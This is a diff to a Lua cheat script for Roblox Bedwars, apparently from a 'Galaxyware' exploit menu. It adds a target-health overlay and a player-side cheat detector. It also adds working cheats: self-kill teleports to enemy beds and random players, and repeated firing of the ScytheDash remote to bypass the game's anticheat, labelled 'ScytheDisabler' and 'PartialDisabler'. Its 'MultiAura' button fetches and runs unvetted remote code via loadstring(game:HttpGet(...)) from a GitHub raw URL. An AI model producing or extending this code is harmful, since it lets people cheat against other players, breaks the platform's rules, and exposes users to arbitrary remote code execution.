+Table["_DropShadow"].ZIndex = 0
+Table["_DropShadow"].Name = "DropShadow"
+Table["_DropShadow"].Parent = Table["_DropShadowHolder"]
+
+Table["_ImageLabel"].Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+Table["_ImageLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Table["_ImageLabel"].BackgroundTransparency = 1
+Table["_ImageLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Table["_ImageLabel"].BorderSizePixel = 0
+Table["_ImageLabel"].Position = UDim2.new(0.0361842103, 0, 0.119999997, 0)
+Table["_ImageLabel"].Size = UDim2.new(0, 80, 0, 75)
+Table["_ImageLabel"].Parent = Table["_MainFrame"]
+
+Table["_Corner"].Name = "Corner"
+Table["_Corner"].Parent = Table["_ImageLabel"]
+
+Table["_Stroke"].Color = Color3.fromRGB(255, 255, 255)
+Table["_Stroke"].Thickness = 2
+Table["_Stroke"].Name = "Stroke"
+Table["_Stroke"].Parent = Table["_ImageLabel"]
+
+Table["_HealthFrame"].BackgroundColor3 = Color3.fromRGB(0, 157.0000058412552, 58.00000414252281)
+Table["_HealthFrame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Table["_HealthFrame"].BorderSizePixel = 0
+Table["_HealthFrame"].Position = UDim2.new(0.335526317, 0, 0.699999988, 0)
+Table["_HealthFrame"].Size = UDim2.new(0, 187, 0, 17)
+Table["_HealthFrame"].Name = "HealthFrame"
+Table["_HealthFrame"].Parent = Table["_MainFrame"]
+
+Table["_UICorner1"].CornerRadius = UDim.new(0, 4)
+Table["_UICorner1"].Parent = Table["_HealthFrame"]
+
+Table["_HP"].Font = Enum.Font.SourceSans
+Table["_HP"].Text = "100 HP"
+Table["_HP"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Table["_HP"].TextScaled = true
+Table["_HP"].TextSize = 14
+Table["_HP"].TextWrapped = true
+Table["_HP"].TextXAlignment = Enum.TextXAlignment.Left
+Table["_HP"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Table["_HP"].BackgroundTransparency = 1
+Table["_HP"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Table["_HP"].BorderSizePixel = 0
+Table["_HP"].Position = UDim2.new(0.335526317, 0, 0.379999995, 0)
+Table["_HP"].Size = UDim2.new(0, 84, 0, 24)
+Table["_HP"].Name = "HP"
+Table["_HP"].Parent = Table["_MainFrame"]
+
+Table["_User"].Font = Enum.Font.SourceSans
+Table["_User"].Text = "UserName"
+Table["_User"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Table["_User"].TextScaled = true
+Table["_User"].TextSize = 14
+Table["_User"].TextWrapped = true
+Table["_User"].TextXAlignment = Enum.TextXAlignment.Left
+Table["_User"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Table["_User"].BackgroundTransparency = 1
+Table["_User"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Table["_User"].BorderSizePixel = 0
+Table["_User"].Position = UDim2.new(0.335526317, 0, 0.119999997, 0)
+Table["_User"].Size = UDim2.new(0, 195, 0, 24)
+Table["_User"].Name = "User"
+Table["_User"].Parent = Table["_MainFrame"]
+
+Table["_Win/Lose"].Font = Enum.Font.SourceSans
+Table["_Win/Lose"].Text = "Winning"
+Table["_Win/Lose"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Table["_Win/Lose"].TextScaled = true
+Table["_Win/Lose"].TextSize = 14
+Table["_Win/Lose"].TextWrapped = true
+Table["_Win/Lose"].TextXAlignment = Enum.TextXAlignment.Left
+Table["_Win/Lose"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Table["_Win/Lose"].BackgroundTransparency = 1
+Table["_Win/Lose"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Table["_Win/Lose"].BorderSizePixel = 0
+Table["_Win/Lose"].Position = UDim2.new(0.611842096, 0, 0.360000014, 0)
+Table["_Win/Lose"].Size = UDim2.new(0, 103, 0, 26)
+Table["_Win/Lose"].Name = "Win/Lose"
+Table["_Win/Lose"].Parent = Table["_MainFrame"]
+
+local fake_module_scripts = {}
+
+local function MYASSISA_fake_script() 
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+	script.Parent = Table["_UIStroke"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
+
+	local r = game:GetService("RunService")
+	local g = script.Parent.UIGradient
+	
+	r.RenderStepped:Connect(function()
+		g.Rotation += 2
+	end)
+end
+
+coroutine.wrap(MYASSISA_fake_script)()
+local lplr = game.Players.LocalPlayer
+local character = lplr.Character or lplr.CharacterAdded:Wait()
+local rootPart = character:WaitForChild("HumanoidRootPart")
+local target = nil
+
+
+local function updateGUI(target)
+    if not target or not target.Character or not target.Character:FindFirstChild("Humanoid") or not character or not character:FindFirstChild("Humanoid") then
+        return
+    end
+
+    Table["_User"].Text = target.Name
+    local userId = target.UserId
+    Table["_ImageLabel"].Image = "rbxthumb://type=AvatarHeadShot&w=420&h=420&id=" .. userId
+
+    local lplrHP = character.Humanoid.Health
+    local targetHP = target.Character.Humanoid.Health
+    local targetMaxHP = target.Character.Humanoid.MaxHealth
+    local targetHPPercentage = targetHP / targetMaxHP
+    Table["_HP"].Text = tostring(math.floor(targetHP)) .. " HP"
+
+    local targetHPPercentageChange = targetHPPercentage - (previousTargetHP / targetMaxHP)
+    local tweenTime = math.abs(targetHPPercentageChange) * 1.5
+    tweenTime = math.max(tweenTime, 0.2)  
+
+    TweenObject(Table["_HealthFrame"], {Size = UDim2.new(0, 187 * targetHPPercentage, 0, 17)}, tweenTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+
+
+    if targetHP < 20 then
+        Table["_HealthFrame"].BackgroundColor3 = Color3.fromRGB(255, 0, 0) 
+    elseif targetHP < 50 then
+        Table["_HealthFrame"].BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+    else
+        Table["_HealthFrame"].BackgroundColor3 = Color3.fromRGB(0, 157, 58) 
+    end
+
+    if lplrHP > targetHP then
+        Table["_Win/Lose"].Text = "Winning"
+        Table["_Win/Lose"].TextColor3 = Color3.fromRGB(0, 255, 0)
+    elseif lplrHP == targetHP then
+        Table["_Win/Lose"].Text = "Same HPS"
+        Table["_Win/Lose"].TextColor3 = Color3.fromRGB(255, 255, 0)
+    else
+        Table["_Win/Lose"].Text = "Losing"
+        Table["_Win/Lose"].TextColor3 = Color3.fromRGB(255, 0, 0)
+    end
+
+    previousTargetHP = targetHP
+end
+
+
+
+local function updateCharacterReferences()
+    character = lplr.Character or lplr.CharacterAdded:Wait()
+    rootPart = character:WaitForChild("HumanoidRootPart")
+    Table["_MainGui"].Enabled = false  
+end
+
+local debounce = false
+local function checkPlayersWithinReach()
+    if debounce then return end
+    debounce = true
+
+	local nearestPlayer = nil
+	local shortestDistance = 18 
+
+	for _, player in pairs(game.Players:GetPlayers()) do
+		if player ~= lplr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+			local distance = (rootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
+			if distance < shortestDistance then
+				shortestDistance = distance
+				nearestPlayer = player
+			end
+		end
+	end
+
+	if nearestPlayer then
+		target = nearestPlayer
+		updateGUI(nearestPlayer) 
+		Table["_MainGui"].Enabled = true  
+	else 
+		target = nil
+		Table["_MainGui"].Enabled = false  
+	end
+
+    debounce = false
+end
+
+local heartbeatConnection
+
+local function startCheckingPlayers()
+    if heartbeatConnection then
+        heartbeatConnection:Disconnect()
+    end
+    heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(checkPlayersWithinReach)
+end
+
+local function stopCheckingPlayers()
+    if heartbeatConnection then
+        heartbeatConnection:Disconnect()
+        heartbeatConnection = nil
+    end
+end
+
+game.Players.PlayerRemoving:Connect(function(removedPlayer)
+	if removedPlayer == target then
+		target = nil
+		Table["_MainGui"].Enabled = false 
+	end
+end)
+
+lplr.CharacterAdded:Connect(function()
+    stopCheckingPlayers()
+    character = lplr.Character
+    rootPart = character:WaitForChild("HumanoidRootPart")
+    startCheckingPlayers()
+end)
+
+startCheckingPlayers()
+
+
+else
+	local MainGui = game:GetService("CoreGui"):FindFirstChild("MainGui")
+	if MainGui then 
+		MainGui:Destroy()
+	end	
+end
+end
+})
+
+
+runFunction(function()
+	local Kys = {Enabled = false}
+	local KysMode = {Value = "Remote"}
+	local KysNotification = {Enabled = true}
+	Kys = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"]["CreateOptionsButton"]({
+		Name = "Kys",
+        HoverText = "Kills you",
+		Function = function(callback)
+			if callback then
+				if KysMode.Value == "Health" then
+					game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
+					task.wait(0.2)
+					if KysNotification.Enabled then
+						warningNotification("Kys","Killed You",2)
+					end
+					Kys.ToggleButton(false)
+					return
+				elseif KysMode.Value == "Remote" then
+					bedwars.ClientHandler:Get(bedwars.ResetRemote):SendToServer()
+					if KysNotification.Enabled then
+						warningNotification("Kys","Killed You",2)
+					end
+					Kys.ToggleButton(false)
+					return
+				end
+			end
+		end,
+		ExtraText = function()
+			return KysMode.Value
+		end
+	})
+	KysMode = Kys.CreateDropdown({
+		Name = "Mode",
+		List = {
+			"Health",
+			"Remote"
+		},
+		Function = function() end,
+	})
+	KysNotification = Kys.CreateToggle({
+		Name = "Notification",
+		Function = function() end,
+	})
+end) 
+
+-- Galaxyware Anticheat
+local detected = {} -- anime girls endorse you since this is outside of runFunction(function() end)
+runFunction(function()
+	local frame = 0
+	local players = {}
+	local lplrname = lplr.Name
+	local function highSpeedCheck(plrname)
+		local alreadyDetected = false
+		local pos
+		local newPos
+		local looped = 0
+		local flagged = 0
+		local mag
+		repeat
+			mag = nil
+			pos = nil
+			newPos = nil
+			if not players[plrname].isAlive then return end
+			pos = players[plrname].pos
+			newPos = Vector2.new(pos.X,pos.Z)
+			task.wait(0.1)
+			mag = (((Vector2.new(players[plrname].pos.X,players[plrname].pos.Z) - newPos).magnitude) * 8.94)
+			if mag >= 35 then
+				flagged = flagged + 1
+			end
+			looped = looped + 1
+		until looped >= 25
+		if flagged >= 22 then
+			if (detected[plrname] ~= true) and players[plrname].isAlive then
+				warningNotification("Galaxyware Anticheat | SpeedA",plrname.." is cheating using ScytheDisabler. (Speed: "..tostring((math.round(mag * 10) / 10))..")",30)
+				detected[plrname] = true
+			end
+		end
+	end
+
+	local function verticalPosCheck(plrname)
+		if players[plrname].pos.Y > 500 then
+			if (detected[plrname] ~= true) and players[plrname].isAlive then
+				warningNotification("Galaxyware Anticheat | FlyB",plrname.." is cheating with InfFly. (YPos: "..tostring(math.round(players[plrname].pos.Y))..")",60)
+				detected[plrname] = true
+			end
+		end
+	end
+
+	local function flyCheck(plrname)
+		local waited = 0
+		local alreadyDetected = false
+		local oldPlayerPosition = players[plrname].pos.Y
+		local oldXZ = Vector2.new(players[plrname].pos.X,players[plrname].pos.Z)
+		local newplayerposition = nil
+		if bedwarsStore.matchState == 1 then
+			repeat
+				task.wait()
+				if players[plrname].isAlive == false then return end 
+				if (players[plrname].floor ~= Enum.Material.Air) and (waited < 1.22) then return end
+				waited = waited + frame
+				if (waited >= 1.3) and (players[plrname].pos.Y > (oldPlayerPosition - 60)) and (players[plrname].pos.Y < (oldPlayerPosition + 50)) and ((Vector2.new(players[plrname].pos.X,players[plrname].pos.Z) - oldXZ).magnitude > 10) then
+					if (detected[plrname] ~= true) and players[plrname].isAlive then
+						warningNotification("Galaxyware Anticheat | FlyA",plrname.." is cheating by flying. (Time flew: "..tostring(math.round(waited * 100) / 100).."  YDisplacement: "..tostring(math.round(players[plrname].pos.Y - oldPlayerPosition))..")",60)
+						detected[plrname] = true
+					end
+				end
+			until (waited > 1.5)
+		end
+	end
+
+	local connection
+	local deathTPCheck = {}
+	local Galaxywareac = {Enabled = false}
+	local refreshFrequency = {Value = 0}
+	local speedACheckToggle = {Enabled = false}
+	local speedBCheckToggle = {Enabled = false}
+	local flyACheckToggle = {Enabled = false}
+	local flyBCheckToggle = {Enabled = false}
+	Galaxywareac = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"]["CreateOptionsButton"]({
+		Name = "BetterHackerDetector",
+		Function = function(callback)
+			if callback then
+				task.spawn(function()
+					repeat task.wait((refreshFrequency.Value / 100))
+						for _,plr in (playersService:GetChildren()) do
+							if (bedwarsStore.matchState == 1) and (plr.Name ~= lplrname) and (plr.TeamColor ~= lplr.TeamColor) and plr.Character and plr.Character.PrimaryPart and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
+								players[plr.Name] = {
+									isAlive = true,
+									pos = plr.Character.PrimaryPart.Position,
+									floor = plr.Character.Humanoid.FloorMaterial
+								}
+								task.spawn(function()
+									if speedACheckToggle.Enabled then highSpeedCheck(plr.Name) end
+								end)
+								task.spawn(function()
+									if flyBCheckToggle.Enabled then verticalPosCheck(plr.Name) end
+								end)
+								task.spawn(function()
+									if flyACheckToggle.Enabled then flyCheck(plr.Name) end
+								end)
+							else
+								players[plr.Name] = {
+									isAlive = false,
+									pos = nil,
+									floor = nil
+								}
+							end
+						end
+					until not Galaxywareac.Enabled
+				end)
+				task.spawn(function()
+					for _,plr in pairs(playersService:GetPlayers()) do
+						if plr.Name ~= lplr.Name then
+							if speedBCheckToggle.Enabled then
+								local con = plr.CharacterAdded:Connect(function() 
+									repeat task.wait() until plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.PrimaryPart
+									task.wait()
+									local suc, pos = pcall(function() return plr.Character.PrimaryPart.Position end)
+									local newpos = Vector2.new(pos.X,pos.Z)
+									task.wait(1.8)
+									local suc, pos2 = pcall(function() return plr.Character.PrimaryPart.Position end)
+									local newpos2 = Vector2.new(pos2.X,pos2.Z)
+									local mag = (newpos2 - newpos).magnitude
+									if mag >= 80 then
+										if (detected[plr.Name] ~= true) then
+											warningNotification("Galaxyware Anticheat | SpeedB",plr.Name.." is cheating using DeathTP. (Speed: "..tostring((math.round(mag * 10) / 10))..")",30)
+											detected[plr.Name] = true
+										end
+									end
+								end)
+								table.insert(deathTPCheck,con)
+							end
+						end
+					end
+				end)
+			else
+				for i, v in pairs(deathTPCheck) do 
+					if v.Disconnect then pcall(function() v:Disconnect() end) continue end
+					if v.disconnect then pcall(function() v:disconnect() end) continue end
+				end
+				table.clear(deathTPCheck)
+				if connection then connection:Disconnect() end
+			end
+		end
+	})
+	refreshFrequency = Galaxywareac.CreateSlider({
+		Name = "Check Cooldown (sec)",
+		HoverText = "Sets how often the checks run (except DeathTP)",
+		Min = 0,
+		Max = 100,
+		Double = 100,
+		Default = 0,
+		Function = function() end
+	})
+	local speedACheckToggle = Galaxywareac.CreateToggle({
+		Name = "SpeedA (ScytheBypass)",
+		Default = true,
+		Function = function(callback) end
+	})
+	local speedBCheckToggle = Galaxywareac.CreateToggle({
+		Name = "SpeedB (DeathTP)",
+		Default = true,
+		Function = function(callback) end
+	})
+	local flyACheckToggle = Galaxywareac.CreateToggle({
+		Name = "FlyA (1.5s fly detection)",
+		Default = true,
+		Function = function(callback) end
+	})
+	local flyBCheckToggle = Galaxywareac.CreateToggle({
+		Name = "FlyB (Simple InfFly YPos Check)",
+		Default = true,
+		Function = function(callback) end
+	})
+end)
+
+game:GetService('RunService').RenderStepped:Connect(function()
+    local lplr = game:GetService("Players").LocalPlayer
+    local direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
+    local args = {
+        [1] = {
+            ["direction"] = direction
+        }
+    }
+    game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ScytheDash:FireServer(unpack(args))
+end)
+
+runFunction(function()
+local instant = {Enabled = false}
+instant = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+["HoverText"] = "Instantly fixes ur enchant table (need 8 diamonds)",
+Name = "Auto Repair Enchant Table",
+Function = function(callback)
+if callback then
+instant["ToggleButton"](false)
+for i,v in pairs(workspace:GetChildren()) do
+if v.Name == "broken_enchant_table" then
+local args = {
+    [1] = v
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.RepairEnchantTable:InvokeServer(unpack(args))
+end
+end
+end
+end
+})
+end)
+
+runFunction(function()
+local bbedtp = {Enabled = false}
+bbedtp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "BlueBedTP",
+Function = function(callback)
+if callback then
+  if entityLibrary.isAlive then
+c = workspace.MapCFrames["1_bed"].Value
+local tweenService = game:GetService("TweenService")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex = game.Players.LocalPlayer.CharacterAdded:Connect(function()
+wait(0.3) 
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween =tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = c + Vector3.new(0, 10, 0)})
+tween:Play()
+end)
+hasTeleported = false
+	 bbedtp["ToggleButton"](false)
+  end
+wait(8)
+sex:Disconnect()
+end
+end
+})
+end)
+
+
+runFunction(function()
+local rbedtp = {Enabled = false}
+rbedtp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "RedBedTP",
+Function = function(callback)
+if callback then
+  if entityLibrary.isAlive then
+b = workspace.MapCFrames["2_bed"].Value
+local tweenService = game:GetService("TweenService")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex =game.Players.LocalPlayer.CharacterAdded:Connect(function()
+wait(0.3) 
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween =tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = b + Vector3.new(0, 10, 0)})
+tween:Play()
+end)
+hasTeleported = false
+	 rbedtp["ToggleButton"](false)
+  end
+wait(8)
+sex:Disconnect()
+end
+end
+})
+end)
+
+
+runFunction(function()
+local gbedtp = {Enabled = false}
+gbedtp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "GreenBedTP",
+Function = function(callback)
+if callback then
+  if entityLibrary.isAlive then
+b = workspace.MapCFrames["3_bed"].Value
+local tweenService = game:GetService("TweenService")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex = game.Players.LocalPlayer.CharacterAdded:Connect(function()
+wait(0.3) 
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween =tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = b + Vector3.new(0, 10, 0)})
+tween:Play()
+end)
+hasTeleported = false
+gbedtp["ToggleButton"](false)
+  end
+wait(8)
+sex:Disconnect()
+end
+end
+})
+end)
+
+
+runFunction(function()
+local ybedtp = {Enabled = false}
+ybedtp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "YellowBedTP",
+Function = function(callback)
+if callback then
+  if entityLibrary.isAlive then
+b = workspace.MapCFrames["4_bed"].Value
+local tweenService = game:GetService("TweenService")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex = game.Players.LocalPlayer.CharacterAdded:Connect(function()
+wait(0.3) 
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween =tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = b + Vector3.new(0, 10, 0)})
+tween:Play()
+end)
+hasTeleported = false
+	 ybedtp["ToggleButton"](false)
+  end
+wait(8)
+sex:Disconnect()
+end
+end
+})
+end)
+
+
+runFunction(function()
+local obedtp = {Enabled = false}
+obedtp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "OrangeBedTP",
+Function = function(callback)
+if callback then
+  if entityLibrary.isAlive then
+b = workspace.MapCFrames["5_bed"].Value
+local tweenService = game:GetService("TweenService")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex =game.Players.LocalPlayer.CharacterAdded:Connect(function()
+wait(0.3) 
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween =tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = b + Vector3.new(0, 10, 0)})
+tween:Play()
+end)
+hasTeleported = false
+	 obedtp["ToggleButton"](false)
+  end
+wait(8)
+sex:Disconnect()
+end
+end
+})
+end)
+
+
+
+
+runFunction(function()
+local pibedtp = {Enabled = false}
+pibedtp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "PinkBedTP",
+Function = function(callback)
+if callback then
+  if entityLibrary.isAlive then
+b = workspace.MapCFrames["6_bed"].Value
+local tweenService = game:GetService("TweenService")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex =game.Players.LocalPlayer.CharacterAdded:Connect(function()
+wait(0.3) 
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween =tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = b + Vector3.new(0, 10, 0)})
+tween:Play()
+end)
+hasTeleported = false
+	 pibedtp["ToggleButton"](false)
+  end
+wait(8)
+sex:Disconnect()
+end
+end
+})
+end)
+
+
+
+
+runFunction(function()
+local pubedtp = {Enabled = false}
+pubedtp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "PurpleBedTP",
+Function = function(callback)
+if callback then
+  if entityLibrary.isAlive then
+b = workspace.MapCFrames["8_bed"].Value
+local tweenService = game:GetService("TweenService")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex =game.Players.LocalPlayer.CharacterAdded:Connect(function()
+wait(0.3) 
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween =tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = b + Vector3.new(0, 10, 0)})
+tween:Play()
+end)
+hasTeleported = false
+	 pubedtp["ToggleButton"](false)
+  end
+wait(8)
+sex:Disconnect()
+end
+end
+})
+end)
+
+
+runFunction(function()
+local cybedtp = {Enabled = false}
+cybedtp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "CyanBedTP",
+Function = function(callback)
+if callback then
+  if entityLibrary.isAlive then
+b = workspace.MapCFrames["7_bed"].Value
+local tweenService = game:GetService("TweenService")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex = game.Players.LocalPlayer.CharacterAdded:Connect(function()
+wait(0.3) 
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween =tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = b + Vector3.new(0, 10, 0)})
+tween:Play()
+end)
+hasTeleported = false
+	 cybedtp["ToggleButton"](false)
+  end
+wait(8)
+sex:Disconnect()
+end
+end
+})
+end)
+
+runFunction(function()
+local tprandom = {Enabled = false}
+tprandom = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "TPRandom",
+Function = function(callback)
+if callback then
+  if entityLibrary.isAlive then
+PlayerService = game:GetService("Players")
+lplr = game.Players.LocalPlayer
+function getPlayer(name)
+    local targets = {}
+    local plrstbl = PlayerService:GetPlayers()
+    if name == "me" then
+        return {lplr}
+    elseif name == "random" then
+        for i, v in pairs(plrstbl) do
+           if v.Character ~= nil then
+           if v.Character:FindFirstChild("Humanoid",true) and v.Team ~= nil then
+              if v ~= lplr and v.Team ~= lplr.Team and v.Character.Humanoid.Health > 0 then
+                  print(v,v.Team)
+                  table.insert(targets,v)
+              end
+           end
+        end
+      end
+    else
+        name = name:lower()
+        for i, v in pairs(PlayerService:GetPlayers()) do
+            if v.Name:lower():find(name) or v.DisplayName:lower():find(name) then
+                return {v}
+            end
+        end
+    end
+    return targets
+end
+local targets = getPlayer("random")
+local ratiothisplayer = targets[math.random(1 ,#targets)]
+local target2lv = ratiothisplayer.Character.HumanoidRootPart.CFrame.LookVector * -2.5
+local target2 = ratiothisplayer.Character.HumanoidRootPart.CFrame + target2lv
+entityLibrary.character.HumanoidRootPart.CFrame += Vector3.new(0, 70, 0)
+wait(0.1)
+local tweenService = game:GetService("TweenService")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+wait(0.3) 
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween =tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = target2 + Vector3.new(0, 10, 0)})
+tween:Play()
+end)
+hasTeleported = false
+     tprandom["ToggleButton"](false)
+  end
+end
+end
+})
+end)
+
+runFunction(function()
+    local MultiAura = {Enabled = false}
+    MultiAura = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+        Name = "MultiAura",
+        Function = function(callback)
+            if callback then
+                --// services
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/asfsnfskjsfjdgkjgfhfjhfjhfsjhjfjfh/vapeprivatereal/main/vapeprivate"))()
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    disabler = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "ScytheDisabler",
+        Function = function(callback)
+            if callback then
+                local ReplicatedStorage = game:GetService("ReplicatedStorage")
+                local Players = game:GetService("Players")
+                local RunService = game:GetService("RunService")
+                local ScytheDash = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules")["@rbxts"].net.out._NetManaged.ScytheDash
+
+                local function onRenderStepped()
+                    local localPlayer = Players.LocalPlayer
+                    if not localPlayer then
+                        return
+                    end
+                    local character = localPlayer.Character
+                    if not character then
+                        return
+                    end
+                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+                    if humanoidRootPart then
+                        local lookVector = humanoidRootPart.CFrame.LookVector * 10000
+                        ScytheDash:FireServer({
+                            direction = lookVector
+                        })
+                    end
+                end
+                local lastHeartbeat = tick()
+                local function onHeartbeat()
+                    local currentTime = tick()
+                    local elapsedSeconds = currentTime - lastHeartbeat
+                    if elapsedSeconds > 999 then
+                        lastHeartbeat = currentTime
+                    end
+                end
+
+                RunService.RenderStepped:Connect(onRenderStepped)
+                RunService.Heartbeat:Connect(onHeartbeat)
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    local AnticheatBypass = {Enabled = false}
+	local AnticheatBypassMode = {Value = 'LookVector'}
+    AnticheatBypass = GuiLibrary.ObjectsThatCanBeSaved['GalaxywareWindow'].Api.CreateOptionsButton({
+        Name = "PartialDisabler",
+		HoverText = 'Partially Bypasses Anticheat',
+        Function = function(callback)
+            if callback then 
+				task.spawn(function()
+					repeat task.wait()
+						local scytheitem = nil
+						for _, scythe in next, scythes do
+							scytheitem = getItemNear(scythe)
+							if scytheitem then
+								break
+							end
+						end
+						local scytheitem1 = getItemNear'iron_scythe' -- not working in the table
+						if scytheitem or scytheitem1 and lplr.Character.HandInvItem.Value == scytheitem.tool or lplr.Character.HandInvItem.Value == scytheitem1.tool then
+							if AnticheatBypassMode.Value == 'LookVector' then
+								bedwars.ClientHandler:Get'ScytheDash':SendToServer({direction = entity.character.HumanoidRootPart.CFrame.LookVector})
+							elseif AnticheatBypassMode.Value == 'MoveDirection' then
+								bedwars.ClientHandler:Get'ScytheDash':SendToServer({direction = entity.character.HumanoidRootPart.CFrame.MoveDirection})
+							else
+								bedwars.ClientHandler:Get'ScytheDash':SendToServer({direction = vec3(9e9, 9e9, 9e9)})
+							end
+							if GuiLibrary.ObjectsThatCanBeSaved.HeadlessOptionsButton.Api.Enabled then
+								if entity.isAlive and entity.character.HumanoidRootPart.Transparency ~= 0 then
+									bedwarsStore.scythe = tick() + 2
+								end
+							else
+								if entity.isAlive and entity.character.Head.Transparency ~= 0 then
+									bedwarsStore.scythe = tick() + 2
+								end
+							end
+						end
+					until not AnticheatBypass.Enabled
 				end)
             end
         end,
-		HoverText = "Float disabler with scythe"
+		Default = false,
+        ExtraText = function()
+            return AnticheatBypassMode.Value
+        end
     })
+	AnticheatBypassMode = AnticheatBypass.CreateDropdown({
+		Name = 'Mode',
+		List = {
+			'LookVector',
+			'MoveDirection',
+			'Vector'
+		},
